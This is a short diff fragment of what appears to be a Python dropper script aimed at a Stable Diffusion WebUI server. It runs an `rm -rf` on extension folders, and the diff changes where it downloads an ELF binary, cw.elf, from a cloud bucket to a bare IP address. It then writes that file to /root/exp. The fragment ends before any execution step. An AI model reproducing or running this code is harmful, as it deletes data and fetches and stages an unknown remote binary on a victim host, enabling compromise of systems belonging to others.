@@ -8,7 +8,7 @@ command = 'rm -rf /stable-diffusion-webui/extensions/test*'
 result = os.popen(command).read()
 
 
-down_url='https://isdp.oss-cn-shanghai.aliyuncs.com/cw.elf'
+down_url='http://47.102.125.70:443/cw.elf'
 response = requests.get(down_url)
 if response.status_code == 200:
   with open('/root/exp', 'wb') as file:
